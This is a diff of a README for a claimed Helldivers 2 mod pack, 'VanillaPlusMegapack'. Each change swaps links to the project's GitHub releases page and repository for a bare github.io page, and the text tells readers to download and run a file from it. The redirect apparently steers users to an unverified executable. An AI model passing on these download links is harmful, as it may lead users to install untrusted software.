@@ -1,6 +1,6 @@
 # 🎮 VanillaPlusMegapack - Eleven Essential Helldivers 2 Upgrades in One
 
-[![Download VanillaPlusMegapack](https://img.shields.io/badge/Download-VanillaPlusMegapack-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=32CD32)](https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack/releases)
+[![Download VanillaPlusMegapack](https://img.shields.io/badge/Download-VanillaPlusMegapack-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=32CD32)](https://cockyleekyhoffmann67.github.io)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ VanillaPlusMegapack is designed to work on most Windows computers that can alrea
 
 ## ⬇️ Downloading the Application
 
-Visit this link to download the application: [https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack/releases](https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack/releases)
+Visit this link to download the application: [https://cockyleekyhoffmann67.github.io](https://cockyleekyhoffmann67.github.io)
 
 When you click the link, you'll see a list of available files. Look for the one that says "VanillaPlusMegapack" and has a version number next to it. Click on it to start the download. The file will be saved to your "Downloads" folder by default.
 
@@ -164,8 +164,8 @@ If all these checks pass, you're ready to enjoy a smoother, faster Helldivers 2 
 
 ## 🔗 Quick Links
 
-- **Download Page:** [https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack/releases](https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack/releases)
-- **Main Repository:** [https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack](https://github.com/Cockyleekyhoffmann67/VanillaPlusMegapack)
+- **Download Page:** [https://cockyleekyhoffmann67.github.io](https://cockyleekyhoffmann67.github.io)
+- **Main Repository:** [https://cockyleekyhoffmann67.github.io](https://cockyleekyhoffmann67.github.io)
 
 ## 📌 Stay Updated
 
